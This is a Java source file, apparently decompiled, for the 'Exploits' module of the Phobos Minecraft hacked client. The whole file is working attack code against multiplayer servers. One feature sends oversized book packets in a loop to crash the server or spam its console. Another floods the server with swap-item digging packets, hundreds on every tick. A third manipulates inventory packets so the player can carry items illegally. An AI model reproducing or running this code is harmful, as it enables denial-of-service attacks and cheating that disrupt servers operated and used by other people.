package me.earth.phobos.features.modules.misc;

import java.util.Random;
import me.earth.phobos.event.events.PacketEvent;
import me.earth.phobos.features.modules.Module;
import me.earth.phobos.features.setting.Bind;
import me.earth.phobos.features.setting.Setting;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.gui.inventory.GuiContainer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.init.Items;
import net.minecraft.init.SoundEvents;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.Slot;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketPlayerDigging.Action;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent;
import org.lwjgl.input.Keyboard;

public class Exploits extends Module {
   public Setting<Boolean> illegalCarry = this.register(new Setting("IllegalCarry", false));
   public Setting<Bind> toXCarry = this.register(new Setting("ToXCarry", new Bind(-1), (v) -> {
      return (Boolean)this.illegalCarry.getValue();
   }));
   public Setting<Bind> fromXCarry = this.register(new Setting("FromXCarry", new Bind(-1), (v) -> {
      return (Boolean)this.illegalCarry.getValue();
   }));
   public Setting<Boolean> bookCrash = this.register(new Setting("BookCrash", false));
   public Setting<Exploits.Mode> mode;
   public Setting<Integer> delay;
   public Setting<Integer> strLength;
   public Setting<Boolean> offhandCrash;
   private final Setting<Boolean> antilag;
   private final Setting<Boolean> docrash;
   private final Setting<Integer> loopzz;
   private Packet packet;
   private String pages;
   private boolean flag;

   public Exploits() {
      super("Exploits", "Some expploits", Module.Category.MISC, true, false, false);
      this.mode = this.register(new Setting("Mode", Exploits.Mode.WindowClick, (v) -> {
         return (Boolean)this.bookCrash.getValue();
      }));
      this.delay = this.register(new Setting("Delay", 5, 1, 500, (v) -> {
         return (Boolean)this.bookCrash.getValue();
      }));
      this.strLength = this.register(new Setting("Length", 600, 100, 655, (v) -> {
         return (Boolean)this.bookCrash.getValue();
      }));
      this.offhandCrash = this.register(new Setting("OffhandCrash", false));
      this.antilag = this.register(new Setting("AntiOffhandCrash", true, (v) -> {
         return (Boolean)this.offhandCrash.getValue();
      }));
      this.docrash = this.register(new Setting("Use Offhand Crash", true, (v) -> {
         return (Boolean)this.offhandCrash.getValue();
      }));
      this.loopzz = this.register(new Setting("Times to loop", 500, 100, 5000, (v) -> {
         return (Boolean)this.offhandCrash.getValue();
      }));
      this.pages = "";
      this.flag = true;
   }

   public void onEnable() {
      if ((Boolean)this.bookCrash.getValue()) {
         this.pages = this.genRandomString((Integer)this.strLength.getValue());
         this.runThread();
         this.flag = true;
      }

   }

   public void onDisable() {
      if ((Boolean)this.bookCrash.getValue()) {
         this.pages = "";
         this.flag = false;
      }

   }

   public void onUpdate() {
      if ((Boolean)this.offhandCrash.getValue()) {
         if ((Boolean)this.docrash.getValue()) {
            for(int i = 0; i < (Integer)this.loopzz.getValue(); ++i) {
               BlockPos playerBlock = new BlockPos(mc.field_71439_g.field_70165_t, mc.field_71439_g.field_70163_u - 1.0D, mc.field_71439_g.field_70161_v);
               mc.field_71439_g.field_71174_a.func_147297_a(new CPacketPlayerDigging(Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
            }
         }

         if ((mc.field_71462_r instanceof GuiMainMenu || mc.field_71462_r instanceof GuiDisconnected || mc.field_71462_r instanceof GuiDownloadTerrain || mc.field_71462_r instanceof GuiConnecting || mc.field_71462_r instanceof GuiMultiplayer) && this.isEnabled()) {
            this.toggle();
         }
      }

   }

   @SubscribeEvent
   public void onPacketSend(PacketEvent.Send event) {
      if ((Boolean)this.offhandCrash.getValue() && (Boolean)this.antilag.getValue() && event.getPacket() instanceof SPacketSoundEffect) {
         SPacketSoundEffect packet = (SPacketSoundEffect)event.getPacket();
         if (packet.func_186978_a() == SoundEvents.field_187719_p) {
            event.setCanceled(true);
         }
      }

   }

   public void onLogout() {
      this.disable();
   }

   public void onUnload() {
      this.disable();
   }

   private void runThread() {
      (new Thread(() -> {
         try {
            ItemStack bookObj = new ItemStack(Items.field_151099_bA);
            NBTTagList list = new NBTTagList();
            NBTTagCompound tag = new NBTTagCompound();
            String author = mc.func_110432_I().func_111285_a();

            for(int i = 0; i < 50; ++i) {
               NBTTagString tString = new NBTTagString(this.pages);
               list.func_74742_a(tString);
            }

            tag.func_74778_a("author", author);
            tag.func_74778_a("title", "\n ZimCRASH \n");
            tag.func_74782_a("pages", list);
            bookObj.func_77983_a("pages", list);
            bookObj.func_77982_d(tag);
            if (this.mode.getValue() == Exploits.Mode.ConsoleSpammer) {
               this.pages = this.genRandomString(8192);
               this.strLength.setValue(8192);
               this.delay.setValue(225);
            }

            while(this.flag) {
               switch((Exploits.Mode)this.mode.getValue()) {
               case CreativeInventory:
                  this.packet = new CPacketCreativeInventoryAction(0, bookObj);
               case WindowClick:
                  this.packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
               case ConsoleSpammer:
                  this.packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
               default:
                  mc.field_71439_g.field_71174_a.func_147297_a(this.packet);

                  try {
                     Thread.sleep((long)(Integer)this.delay.getValue());
                  } catch (Exception var7) {
                     Thread.interrupted();
                  }
               }
            }
         } catch (Exception var8) {
            var8.printStackTrace();
         }

      })).start();
   }

   private String genRandomString(Integer Length) {
      String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
      StringBuilder salt = new StringBuilder();
      Random rnd = new Random();

      while(salt.length() < Length) {
         int index = (int)(rnd.nextFloat() * (float)SALTCHARS.length());
         salt.append(SALTCHARS.charAt(index));
      }

      String saltStr = salt.toString();
      return saltStr;
   }

   @SubscribeEvent(
      priority = EventPriority.NORMAL,
      receiveCanceled = true
   )
   public void onKeyInput(KeyInputEvent event) {
      if ((Boolean)this.illegalCarry.getValue() && Keyboard.getEventKeyState() && mc.field_71462_r instanceof GuiContainer) {
         GuiContainer container;
         Slot slot;
         if (((Bind)this.toXCarry.getValue()).getKey() == Keyboard.getEventKey()) {
            container = (GuiContainer)mc.field_71462_r;
            slot = container.getSlotUnderMouse();
            if (slot != null) {
               mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, slot.getSlotIndex(), 0, ClickType.PICKUP, mc.field_71439_g);
               mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, -999, 0, ClickType.QUICK_CRAFT, mc.field_71439_g);
               mc.field_71442_b.func_187098_a(0, 1, 1, ClickType.QUICK_CRAFT, mc.field_71439_g);
               mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, -999, 2, ClickType.QUICK_CRAFT, mc.field_71439_g);
            }
         } else if (((Bind)this.fromXCarry.getValue()).getKey() == Keyboard.getEventKey()) {
            container = (GuiContainer)mc.field_71462_r;
            slot = container.getSlotUnderMouse();
            if (slot != null) {
               mc.field_71442_b.func_187098_a(0, 1, 0, ClickType.PICKUP, mc.field_71439_g);
               mc.field_71442_b.func_187098_a(0, -999, 0, ClickType.QUICK_CRAFT, mc.field_71439_g);
               mc.field_71442_b.func_187098_a(container.field_147002_h.field_75152_c, slot.getSlotIndex(), 1, ClickType.QUICK_CRAFT, mc.field_71439_g);
               mc.field_71442_b.func_187098_a(0, -999, 2, ClickType.QUICK_CRAFT, mc.field_71439_g);
            }
         }
      }

   }

   private static enum Mode {
      CreativeInventory,
      WindowClick,
      ConsoleSpammer;
   }
}
